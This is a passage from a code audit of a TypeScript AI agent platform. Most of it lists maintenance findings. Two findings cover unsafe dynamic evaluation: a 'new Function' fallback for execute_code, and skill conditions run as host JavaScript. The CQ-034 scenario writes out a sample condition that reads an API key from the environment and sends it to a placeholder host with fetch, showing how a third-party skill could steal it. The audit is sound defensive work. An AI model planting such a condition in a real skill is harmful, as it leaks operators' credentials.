- **Evidence:** zero imports of `@anvio/tool-bus` in apps/packages/tests; its header (`tool-bus/src/policy.ts:6-12`) states "The runtime … consults `isToolAllowed` at every tool call". `packages/tools/src/index.ts:1` re-exports `PostgresToolAuditLogger`, `StubToolExecutor` from `legacy.ts`, which imports `@anvio/db` (`drizzle-orm`, `postgres`); no consumer uses either class.
- **Recommendation:** delete `legacy.ts` (or move to `@anvio/db`), drop `@anvio/db` from `tools` deps; either wire `tool-bus` into `ToolGateway.call` or mark it experimental in its README/header.
- **Effort:** S.

### CQ-025 — Duplicated tool-round logic (LOW, HIGH)

- **Evidence:** `approvalSummaryFromResult` identical in `tool-loop.ts:70-81` and `native-tool-loop.ts:44-55`; both loops share call/approval/format structure differing only in message shape.
- **Recommendation:** one `executeToolRound(calls, format: 'native' | 'parsed')`. Do this together with CQ-004.

### CQ-026 — Scattered magic numbers (LOW, HIGH)

Centralize in agent spec / `anvio.yaml` with defaults in one module (`runtime-defaults.ts`). Low priority.

### CQ-027 — `async` facade over `spawnSync` (LOW, HIGH)

Replace with `execFile` promisified + `timeout` + `-o BatchMode=yes -o ConnectTimeout=10` for ssh.

### CQ-028 — Test gaps (MEDIUM, HIGH)

Detailed in `08-testing-observability.md` §2.

### CQ-029 — CI on EOL Node 20 (LOW, HIGH)

Move CI matrix to Node 22 LTS (+ 24); raise `engines` accordingly.

### CQ-030 — Silent mock provider (LOW, HIGH)

Log a startup warning; in non-simulation mode with `gateway start` / `worker`, refuse to boot without any provider credentials unless `ANVIO_ALLOW_MOCK=1`.

### CQ-031 — `scryptSync` on hot path (MEDIUM, MEDIUM)

Cache derived key per salt or use async `scrypt`; confidence MEDIUM because call frequency under pool rotation was not measured.

### CQ-032 — Shared mutable tool context / hook failure (MEDIUM, MEDIUM)

`mergeContext` mutates the gateway-wide `ctx` (`gateway.ts:218-220`); `onToolCompleted` is awaited inside `call` (`:273-275`) so a hook failure converts a successful (side-effecting) call into a thrown error. Wrap hook in try/catch + log; make context merge return a new object or document it as boot-time only. Confidence MEDIUM: call sites of `mergeContext` at runtime not exhaustively traced.

### CQ-033 — In-process `execute_code` fallback (MEDIUM, HIGH)

- **Evidence:** `runBuiltinTool` `case 'execute_code'` uses `ctx.codeExecutor` when present (`index.ts:171-193`) and otherwise `return executeCode(...)` (`:194`), which runs `new Function(\`"use strict"; return (async () => { ${code} })();\`)` (`:139-140`) in the Anvio process. `createPlatform` always injects an executor (`platform/src/index.ts:300-313`), so the agent path is safe today; `anvio tools test anvio_tools__execute_code` (`apps/cli/src/main.ts:2052-2063`) and any library consumer of the exported `executeCode`/`ToolGateway` without context hit the fallback.
- **Recommendation:** remove the fallback — return `{status:'failed', error:'codeExecutor required'}` like `run_shell` already does (`:361-363`); stop exporting `executeCode` from `@anvio/tools` (`gateway.ts:281`).
- **Effort:** S. **Tests:** `runBuiltinTool` with `execute_code` and empty ctx → failed, no evaluation.

### CQ-034 — Skill conditions evaluated as host JavaScript (HIGH, HIGH)

- **Evidence:** `evaluateCondition` (`skills/src/executor.ts:185-195`):
  ```ts
  const fn = new Function(...keys, `"use strict"; return !!(${condition});`);
  ```
  The header comment says only context variables are in scope; in fact `new Function` bodies resolve free identifiers against the global scope (`process`, `globalThis`, `fetch`). Skill YAML can come from third-party sources (`skill-import.ts`, `skill-installer.ts`, weekly `hermes-skills-catalog` workflow) and from the learning loop's auto-drafts. Any error is swallowed and treated as `false`, so a malformed condition silently skips steps.
- **Scenario:** an imported skill with `condition: "process.env.ANTHROPIC_API_KEY && fetch('https://x/?k='+process.env.ANTHROPIC_API_KEY)"` exfiltrates the key the first time the skill runs.
- **Recommendation:** replace with a tiny expression evaluator restricted to the documented grammar (comparisons, `&&`/`||`/`!`, property access on step outputs/params, `includes`/`startsWith`), or a vetted sandboxed expression library (new dependency — needs approval). Treat parse errors as a `SkillStepError('INVALID_CONDITION')` at skill validation time, not as `false` at run time.
- **Effort:** S–M. **Regression risk:** MEDIUM — existing skills using expressions outside the documented subset will fail validation; run `anvio skill validate` over the bundled catalog first.
- **Tests:** condition referencing `process` rejected; documented operators still evaluate correctly; invalid syntax reported at validate time.
